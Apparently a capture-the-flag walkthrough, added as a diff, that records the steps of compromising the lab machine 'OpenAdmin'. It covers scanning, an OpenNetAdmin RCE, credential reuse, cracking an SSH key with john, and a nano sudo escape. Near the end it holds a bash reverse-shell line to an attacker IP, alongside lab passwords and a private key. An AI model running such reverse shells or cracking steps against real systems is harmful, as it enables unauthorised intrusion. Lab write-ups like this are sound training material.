@@ -1,0 +1,131 @@
+---PORT SCAN---
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
+|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
+|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+---DIR ENUM---
+/:
+  /music (Status: 301)
+  /artwork (Status: 301)
+  /sierra (Status: 301)
+  /server-status (Status: 403)
+
+burpsuipt spidering found /ona/ too
+
+---ATTEMPTS---
+on /ona/ page:
+  Your version    = v18.1.1
+  -
+  Domain name 	Parent domain 	Records in domain 	 
+  openadmin.htb                   	  	0 
+
+maybe vhr - nope
+ONA:
+  OpenNetAdmin provides a database managed inventory of your IP network. Each subnet, host, and IP can be tracked via a centralized AJAX enabled web interface that can help reduce tracking errors.
+found a RCE exploit for 18.1.1
+done!
+
+---PRIVESC---
+-rwxr-xr-x 1 root root    18504 Nov 23  2018 /usr/bin/lxcfs
+found int /opt/ona/www/local/config/database_settings.inc.php:
+  array (
+    'db_type' => 'mysqli',
+    'db_host' => 'localhost',
+    'db_login' => 'ona_sys',
+    'db_passwd' => 'n1nj4W4rri0R!',
+    'db_database' => 'ona_default',
+    'db_debug' => false,
+  )
+
+trying to login with same pass on another users
+joanna (fail)
+jimmy (success)
+
+going to /var/www/internal to see if something interesting appears
+in main.php:
+  $output = shell_exec('cat /home/joanna/.ssh/id_rsa');
+
+in /var/www/html/sierra/js/jquery.form.js:
+  [ { name: 'username', value: 'jresig' }, { name: 'password', value: 'secret' } ]
+
+check if can exploit motd with ssh login (fail)
+
+checking php config to see if the /var/www/internal/ website can be accessed
+*cat /etc/apache2/sites-available/internal.conf:
+  Listen 127.0.0.1:52846
+  <VirtualHost 127.0.0.1:52846>
+      ServerName internal.openadmin.htb
+      DocumentRoot /var/www/internal
+  
+  <IfModule mpm_itk_module>
+  AssignUserID joanna joanna
+  </IfModule>
+  
+      ErrorLog ${APACHE_LOG_DIR}/error.log
+      CustomLog ${APACHE_LOG_DIR}/access.log combined
+  
+  </VirtualHost>
+
+*wget 127.0.0.1:52846/main.php
+could net retrieve the ssh key
+the user jimmy can write to main.php
+cleaning the login ver and wget again:
+  <pre>-----BEGIN RSA PRIVATE KEY-----
+  Proc-Type: 4,ENCRYPTED
+  DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D
+  
+  kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
+  ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
+  ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
+  6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
+  ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
+  y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
+  9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
+  piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
+  /U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
+  40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
+  fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
+  9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
+  X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
+  S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
+  FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
+  Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
+  RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
+  uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
+  1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
+  XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
+  yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+  +4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
+  qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
+  z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
+  K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
+  -----END RSA PRIVATE KEY-----
+  </pre><html>
+  <h3>Don't forget your "ninja" password</h3>
+  Click here to logout <a href="logout.php" tite = "Logout">Session
+  </html>
+
+trying to ssh into joanna using the previously found password (fail)
+using john to crack
+*python3 /usr/share/john/ssh2john joanna_id_rsa
+*sudo john --format=ssh joanna_hash -wordlist=/usr/share/wordlists/rockyou.txt
+*sudo john joanna_hash --show:
+  joanna_id_rsa:bloodninjas
+done!
+*cat /home/joanna/user.txt
+*sudo -l:
+  User joanna may run the following commands on openadmin:
+    (ALL) NOPASSWD: /bin/nano /opt/priv
+
+using nano to exec a shell
+*Control+R+X
+*bash -i >& /dev/tcp/10.10.14.27/5555 0>&1
+kudos!
+*cat /root/root.txt
